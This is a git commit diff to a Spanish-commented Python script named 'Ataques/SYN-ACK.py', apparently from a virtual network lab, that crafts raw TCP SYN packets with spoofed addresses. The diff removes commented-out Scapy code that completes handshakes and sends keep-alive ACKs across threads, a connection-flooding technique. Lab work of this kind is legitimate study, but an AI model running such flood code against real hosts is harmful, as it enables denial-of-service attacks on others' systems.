41df41705a9eebb80ef7a7baff9163dc79ca2f14
Ubuntu <ubuntu@ip-172-31-21-180.ec2.internal>
2024-09-06 03:37:15 +0000

    1st try PortMirror

--- Ataques/SYN-ACK.py
+++ Ataques/SYN-ACK.py
@@ -8,7 +8,7 @@ import socket
 
 def create_syn_packet(src_ip, dst_ip, src_port, dst_port):
     # Crear el paquete Ethernet
-    eth = ethernet.Ethernet(dst='ff:ff:ff:ff:ff:ff', src='52:6f:7b:49:78:20', type=0x0800)
+    eth = ethernet.Ethernet(dst='ff:ff:ff:ff:ff:ff', src='00:00:00:00:00:00', type=0x0800)
 
     # Crear el paquete IP
     ip_pkt = ip.IP(src=src_ip, dst=dst_ip)
@@ -46,56 +46,3 @@ if __name__ == "__main__":
     
     # Enviar el paquete SYN a través de la interfaz h2-eth0
     send_packet(syn_packet, 'h2-eth0')
-
-
-
-
-#--------------------------------------------------------------------------------------------------------------
-
-
-
-    # Crear el paquete SYN para iniciar la conexión
-    #source_ports = list(range(1024, 65535))
-    #sport = random.choice(source_ports)
-    
-    #syn = IP(dst=ip)/TCP(sport=1024, dport=port, flags='S')
-    #send(syn,timeout=1000)
-    #time.sleep(2)
-    #syn_ack = sr1(syn, timeout=1000, verbose=0)  # Enviar y recibir el SYN-ACK
-
-    #if syn_ack is None:
-    #    print(f"Conexión a {ip}:{port} falló al recibir SYN-ACK.")
-    #    return
-    #else:
-    #   print(syn_ack)
-
-    # Asegúrate de que se haya recibido un SYN-ACK
-    #if syn_ack.haslayer(TCP) and syn_ack[TCP].flags == 'SA':
-    #    # Crear el paquete ACK para completar el three-way handshake
-    #    ack = IP(dst=ip)/TCP(dport=port, sport=syn_ack[TCP].dport, flags='A', seq=syn_ack.ack, ack=syn_ack.seq + 1)
-    #    send(ack)
-    #    print(f"Conexión establecida a {ip}:{port}")#
-
-        # Enviar paquetes TCP con la bandera ACK para mantener la conexión viva
-    #    while True:
-    #        try:
-    #            # El paquete ACK para mantener la conexión
-    #            keep_alive = IP(dst=ip)/TCP(dport=port, sport=syn_ack[TCP].dport, flags='A', seq=syn_ack.ack, ack=syn_ack.seq + 1)
-    #            send(keep_alive)
-    #            print(f"Enviando ACK a {ip}:{port}")
-    #            time.sleep(1)  # Pausa breve entre los envíos
-    #        except KeyboardInterrupt:
-    #            print("Interrumpido por el usuario.")
-    #            break
-    #        except Exception as e:
-    #            print(f"Error: {e}")
-    #            break
-    #else:
-    #    print(f"No se recibió un SYN-ACK válido desde {ip}:{port}")
-
-
-    # Crea múltiples hilos para simular múltiples conexiones simultáneas
-    #for i in range(1):  # Ajusta el número de hilos según sea necesario
-     #   thread = threading.Thread(target=send_tcp_ack, args=(target_ip, target_port))
-      #  thread.start()
-       # time.sleep(10)  # Retraso breve para escalonar la creación de conexiones
